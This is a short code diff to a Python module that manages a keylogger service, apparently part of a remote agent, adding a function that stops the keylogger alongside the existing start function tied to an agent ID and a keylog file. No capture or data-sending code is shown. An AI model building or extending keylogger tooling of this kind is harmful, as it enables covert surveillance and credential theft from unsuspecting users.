@@ -1,5 +1,5 @@
 from config.settings import KEYLOG_FILE
-from actions.keylogger import start_keylogger
+from actions.keylogger import start_keylogger, stop_keylogger
 from logger import logger
 
 def start_keylogger_service(agent_id):
@@ -18,3 +18,11 @@ def start_keylogger_service(agent_id):
 
     except Exception as e:
         logger.error(f"Key logger error: {e}")
+
+
+def stop_keylogger_service():
+    """Stop the key logger service."""
+    try:
+        stop_keylogger()
+    except Exception as e:
+        logger.error(f"Key logger stop error: {e}")
